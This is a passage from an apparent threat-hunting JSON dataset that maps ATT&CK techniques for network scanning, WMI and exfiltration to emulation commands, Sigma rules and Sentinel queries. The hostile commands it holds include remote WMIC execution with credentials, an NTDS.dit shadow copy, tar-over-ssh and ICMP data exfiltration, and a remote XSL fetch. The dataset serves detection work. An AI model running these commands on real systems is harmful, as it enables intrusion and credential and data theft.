= $socket.beginconnect(\"$construct$a\", $_, $null, $null);\n$Connection.AsyncWaitHandle.waitOne(50,$false) | out-null;\nif ($socket.connected -eq $true) { echo \"Port $_ is open!\"};\n$socket.Close | Out-Null; }}\n"}}}}}, {"Threat Hunting Tables": {"chain_id": "100213", "os": "windows", "parent_process": "rcpping.exe", "commandline_string": "-s 127.0.0.1 -t ncacn_np", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "network_service_scanning", "mitre_attack": "T1046", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Rpcping.md"}}, {"Threat Hunting Tables": {"chain_id": "100214", "os": "windows", "parent_process": "rcpping.exe", "commandline_string": "-s 127.0.0.1 -e 1234 -a privacy -u NTLM", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "network_service_scanning", "mitre_attack": "T1046", "itw_sample": "https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Rpcping.md"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/recon/find_fruit", "ATT&CK Technique #1": "T1046", "ATT&CK Technique #2": "", "Technique": "Network Service Scanning", "Concatenate for Python Dictionary": "\"powershell/recon/find_fruit\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/get_sql_instance_domain", "ATT&CK Technique #1": "T1046", "ATT&CK Technique #2": "", "Technique": "Network Service Scanning", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_sql_instance_domain\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/get_sql_server_info", "ATT&CK Technique #1": "T1046", "ATT&CK Technique #2": "", "Technique": "Network Service Scanning", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_sql_server_info\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/portscan", "ATT&CK Technique #1": "T1046", "ATT&CK Technique #2": "", "Technique": "Network Service Scanning", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/portscan\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/find_fruit", "ATT&CK Technique #1": "T1046", "ATT&CK Technique #2": "", "Technique": "Network Service Scanning", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/find_fruit\":  [\"T1046\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/port_scan", "ATT&CK Technique #1": "T1046", "ATT&CK Technique #2": "", "Technique": "Network Service Scanning", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/port_scan\":  [\"T1046\"],"}}], "command_list": ["for port in {1..65535};\ndo\n  echo >/dev/tcp/192.168.1.1/$port && echo \"port $port is open\" || echo \"port $port is closed\" : ;\ndone\n", "nmap -sS 192.168.1.0/24 -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n", null, "nmap -sS #{network_range} -p #{port}\ntelnet 192.168.1.1 #{port}\nnc -nv 192.168.1.1 #{port}\n", {"darwin": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}, "linux": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}}, {"darwin": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}, "linux": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}}, {"windows": {"psh": {"command": "$local_addr = (Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne \"Disconnected\" }).IPv4Address.IPAddress;\n$temp = $local_addr.split('.')[0..2];\n$construct = $temp[0] + '.' + $temp[1] + '.' + $temp[2] + \".\";\n1..255 | % { $a = $_; write-host \"------\"; write-host \"$construct$a\";\n22,53,80,445 | % { $socket = new-object system.net.sockets.tcpclient;\n$Connection = $socket.beginconnect(\"$construct$a\", $_, $null, $null);\n$Connection.AsyncWaitHandle.waitOne(50,$false) | out-null;\nif ($socket.connected -eq $true) { echo \"Port $_ is open!\"};\n$socket.Close | Out-Null; }}\n"}}}, "rcpping.exe -s 127.0.0.1 -t ncacn_np", "rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM", "powershell/recon/find_fruit", "powershell/recon/find_fruit", "powershell/situational_awareness/network/get_sql_instance_domain", "powershell/situational_awareness/network/get_sql_instance_domain", "powershell/situational_awareness/network/get_sql_server_info", "powershell/situational_awareness/network/get_sql_server_info", "powershell/situational_awareness/network/portscan", "powershell/situational_awareness/network/portscan", "python/situational_awareness/network/find_fruit", "python/situational_awareness/network/find_fruit", "python/situational_awareness/network/port_scan", "python/situational_awareness/network/port_scan"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Java Running with Remote Debugging", "id": "8f88e3f6-2a49-48f5-a5c4-2f7eedf78710", "description": "Detects a JAVA process running with remote debugging allowing more than just localhost to connect", "author": "Florian Roth", "tags": ["attack.discovery", "attack.t1046"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "*transport=dt_socket,address=*"}, "exclusion": [{"CommandLine": "*address=127.0.0.1*"}, {"CommandLine": "*address=localhost*"}], "condition": "selection and not exclusion"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["unknown"], "level": "medium"}}]}, {"technique_id": "T1047", "commands": [{"source": "atomics/T1047/T1047.yaml", "command": "wmic useraccount get /ALL /format:csv\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic process get caption,executablepath,commandline /format:csv\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic qfe get description,installedOn /format:csv\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"127.0.0.1\" service where (caption like \"%#{service_search_string}%\")\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"#{node}\" service where (caption like \"%Spooler%\")\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic process call create notepad.exe\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"127.0.0.1\" process call create #{process_to_execute}\n", "name": null}, {"source": "atomics/T1047/T1047.yaml", "command": "wmic /node:\"#{node}\" process call create notepad.exe\n", "name": null}, {"source": "data/abilities/collection/94f21386-9547-43c4-99df-938ab05d45ce.yml", "command": {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "name": "Capture process id, executable path, pid and parent pid before writing to disk"}, {"source": "data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml", "command": {"windows": {"psh": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}, "cmd": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}}}, "name": "Remotely executes 54ndc47 over WMI"}, {"source": "data/abilities/execution/ece5dde3-d370-4c20-b213-a1f424aa8d03.yml", "command": {"windows": {"psh": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"taskkill /f /im s4ndc4t.exe\"\n"}}}, "name": "Remotely executes 54ndc47 over WMI"}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*process call create*", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*path AntiVirusProduct get*", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*path FirewallProduct get*", "name": null}, {"source": "Threat Hunting Tables", "command": "WmiPrvSE.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE: \"192.168.0.1\" process call create \"*.exe\"", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM <path> ^> <path>\"", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\n#sysmon log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: WMI Commandline Utility\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: wmic.exe\nCommandLine: wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl \"\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x888\nNew Process name: 'C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe'", "name": "Log"}], "parsed_datasets": [{"Atomic Red Team Test - Windows Management Instrumentation": {"attack_technique": "T1047", "display_name": "Windows Management Instrumentation", "atomic_tests": [{"name": "WMI Reconnaissance Users", "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "wmic useraccount get /ALL /format:csv\n"}}, {"name": "WMI Reconnaissance Processes", "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "wmic process get caption,executablepath,commandline /format:csv\n"}}, {"name": "WMI Reconnaissance Software", "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "wmic qfe get description,installedOn /format:csv\n"}}, {"name": "WMI Reconnaissance List Remote Services", "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreacheable\n", "supported_platforms": ["windows"], "input_arguments": {"node": {"description": "Ip Address", "type": "String", "default": "127.0.0.1"}, "service_search_string": {"description": "Name Of Service", "type": "String", "default": "Spooler"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")\n"}}, {"name": "WMI Execute Local Process", "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n", "supported_platforms": ["windows"], "input_arguments": {"process_to_execute": {"description": "Name or path of process to execute.", "type": "String", "default": "notepad.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "wmic process call create #{process_to_execute}\n", "cleanup_command": "wmic process where name='#{process_to_execute}' delete >nul 2>&1\n"}}, {"name": "WMI Execute Remote Process", "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable \n", "supported_platforms": ["windows"], "input_arguments": {"node": {"description": "Ip Address", "type": "String", "default": "127.0.0.1"}, "process_to_execute": {"description": "Name or path of process to execute.", "type": "String", "default": "notepad.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "wmic /node:\"#{node}\" process call create #{process_to_execute}\n", "cleanup_command": "wmic /node:\"#{node}\" process where name='#{process_to_execute}' delete >nul 2>&1\n"}}]}}, {"Mitre Stockpile - Capture process id, executable path, pid and parent pid before writing to disk": {"id": "94f21386-9547-43c4-99df-938ab05d45ce", "name": "WMIC Process Enumeration", "description": "Capture process id, executable path, pid and parent pid before writing to disk", "tactic": "collection", "technique": {"attack_id": "T1047", "name": "WMIC"}, "platforms": {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}}}, {"Mitre Stockpile - Remotely executes 54ndc47 over WMI": {"id": "2a32e46f-5346-45d3-9475-52b857c05342", "name": "Start 54ndc47 (WMI)", "description": "Remotely executes 54ndc47 over WMI", "tactic": "execution", "technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "platforms": {"windows": {"psh": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}, "cmd": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}]}}, {"Mitre Stockpile - Remotely executes 54ndc47 over WMI": {"id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "name": "Start 54ndc47 (WMI)", "description": "Remotely executes 54ndc47 over WMI", "tactic": "execution", "technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "platforms": {"windows": {"psh": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"taskkill /f /im s4ndc4t.exe\"\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}]}}, {"Threat Hunting Tables": {"chain_id": "100098", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/NODE:*process call create*", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "wmi", "mitre_attack": "T1047", "itw_sample": "f86c9d4c4b0afad1bb812fff0191b50c731760494ed45986e93b858daf386226"}}, {"Threat Hunting Tables": {"chain_id": "100099", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/NODE:*path AntiVirusProduct get*", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "wmi", "mitre_attack": "T1047", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100100", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/NODE:*path FirewallProduct get*", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "wmi", "mitre_attack": "T1047", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100102", "os": "windows", "parent_process": "WmiPrvSE.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "wmi", "mitre_attack": "T1047", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100171", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/NODE: \"192.168.0.1\" process call create \"*.exe\"", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "execution", "mitre_attack": "T1047", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100172", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM <path> ^> <path>\"", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "execution", "mitre_attack": "T1047", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100173", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "execution", "mitre_attack": "T1047", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_wmi", "ATT&CK Technique #1": "T1047", "ATT&CK Technique #2": "", "Technique": "Windows Management Instrumentation", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_wmi\":  [\"T1047\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/elevated/wmi", "ATT&CK Technique #1": "T1047", "ATT&CK Technique #2": "", "Technique": "Windows Management Instrumentation", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/wmi\":  [\"T1047\"],"}}], "command_list": ["wmic useraccount get /ALL /format:csv\n", "wmic process get caption,executablepath,commandline /format:csv\n", "wmic qfe get description,installedOn /format:csv\n", "wmic /node:\"127.0.0.1\" service where (caption like \"%#{service_search_string}%\")\n", "wmic /node:\"#{node}\" service where (caption like \"%Spooler%\")\n", "wmic process call create notepad.exe\n", "wmic /node:\"127.0.0.1\" process call create #{process_to_execute}\n", "wmic /node:\"#{node}\" process call create notepad.exe\n", {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, {"windows": {"psh": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}, "cmd": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}}}, {"windows": {"psh": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"taskkill /f /im s4ndc4t.exe\"\n"}}}, "wmic.exe /NODE:*process call create*", "wmic.exe /NODE:*path AntiVirusProduct get*", "wmic.exe /NODE:*path FirewallProduct get*", "WmiPrvSE.exe", "wmic.exe /NODE: \"192.168.0.1\" process call create \"*.exe\"", "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM <path> ^> <path>\"", "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "powershell/lateral_movement/invoke_wmi", "powershell/lateral_movement/invoke_wmi", "powershell/persistence/elevated/wmi", "powershell/persistence/elevated/wmi", "Log\n#sysmon log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: WMI Commandline Utility\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: wmic.exe\nCommandLine: wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl \"\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x888\nNew Process name: 'C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe'"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 20 and wmi_consumer_type contains \"Command Line\"", "name": "WMI Command Execution"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 11 and process_command_line contains \"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe\"", "name": "Windows Management Instrumentation Active Script Event Consumer FileAccess"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_parent_command_line contains \"C:\\\\Windows\\\\System32\\\\svchost.exe\"or process_command_line contains \"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe\")", "name": "Windows Management Instrumentation Active Script Event Consumer Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3 and (process_path contains \"wmic.exe\"or process_command_line contains \"wmic\")", "name": "Windows Management Instrumentation Network"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_parent_command_line contains \"wmiprvse.exe\"or process_path contains \"wmic.exe\"or process_command_line contains \"wmic\")", "name": "Windows Management Instrumentation Process"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Create a remote process by wmic\ndescription: windows server 2016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: system\ndetection:\nselection:\nEventID: 4688 # Process Creation\nNewprocessname: 'C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: 'wmic.exe / node: * process *' # command-line process\ncondition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "SquiblyTwo", "id": "8d63dadf-b91b-4187-87b6-34a1114577ea", "status": "experimental", "description": "Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash", "references": ["https://subt0x11.blogspot.ch/2018/04/wmicexe-whitelisting-bypass-hacking.html", "https://twitter.com/mattifestation/status/986280382042595328"], "tags": ["attack.defense_evasion", "attack.t1047"], "author": "Markus Neis / Florian Roth", "falsepositives": ["Unknown"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"Image": ["*\\wmic.exe"], "CommandLine": ["wmic * *format:\\\"http*", "wmic * /format:'http", "wmic * /format:http*"]}, "selection2": {"Imphash": ["1B1A3F43BF37B5BFE60751F2EE2F326E", "37777A96245A3C74EB217308F3546F4C", "9D87C9D67CE724033C0B40CC4CA1B206"], "CommandLine": ["* *format:\\\"http*", "* /format:'http", "* /format:http*"]}, "condition": "1 of them"}}}, {"data_source": {"title": "Suspicious WMI execution", "id": "526be59f-a573-4eea-b5f7-f0973207634d", "status": "experimental", "description": "Detects WMI executing suspicious commands", "references": ["https://digital-forensics.sans.org/blog/2010/06/04/wmic-draft/", "https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1", "https://blog.malwarebytes.com/threat-analysis/2016/04/rokku-ransomware/"], "author": "Michael Haag, Florian Roth, juju4", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\wmic.exe"], "CommandLine": ["*/NODE:*process call create *", "* path AntiVirusProduct get *", "* path FirewallProduct get *", "* shadowcopy delete *"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.execution", "attack.t1047", "car.2016-03-002"], "falsepositives": ["Will need to be tuned", "If using Splunk, I recommend | stats count by Computer,CommandLine following for easy hunting by Computer/CommandLine."], "level": "medium"}}, {"data_source": {"title": "Login with WMI", "id": "5af54681-df95-4c26-854f-2565e13cfab0", "status": "stable", "description": "Detection of logins performed with WMI", "author": "Thomas Patzke", "tags": ["attack.execution", "attack.t1047"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4624, "ProcessName": "*\\WmiPrvSE.exe"}, "condition": "selection"}, "falsepositives": ["Monitoring tools", "Legitimate system administration"], "level": "low"}}, {"data_source": {"title": "WMI Persistence", "id": "0b7889b4-5577-4521-a60a-3376ee7f9f7b", "status": "experimental", "description": "Detects suspicious WMI event filter and command line event consumer based on event id 5861 and 5859 (Windows 10, 2012 and higher)", "author": "Florian Roth", "references": ["https://twitter.com/mattifestation/status/899646620148539397", "https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"], "tags": ["attack.execution", "attack.persistence", "attack.t1047"], "logsource": {"product": "windows", "service": "wmi"}, "detection": {"selection": {"EventID": 5861}, "keywords": {"Message": ["*ActiveScriptEventConsumer*", "*CommandLineEventConsumer*", "*CommandLineTemplate*"]}, "selection2": {"EventID": 5859}, "condition": "selection and 1 of keywords or selection2"}, "falsepositives": ["Unknown (data set is too small; further testing needed)"], "level": "medium"}}, {"data_source": {"title": "WMI Persistence - Script Event Consumer", "id": "ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e", "status": "experimental", "description": "Detects WMI script event consumers", "references": ["https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"], "author": "Thomas Patzke", "date": "2018/03/07", "tags": ["attack.execution", "attack.persistence", "attack.t1047"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "C:\\WINDOWS\\system32\\wbem\\scrcons.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe"}, "condition": "selection"}, "falsepositives": ["Legitimate event consumers"], "level": "high"}}]}, {"technique_id": "T1048", "commands": [{"source": "atomics/T1048/T1048.yaml", "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/exfil_dropbox", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/exfil_dropbox", "name": "Empire Module Command"}, {"source": 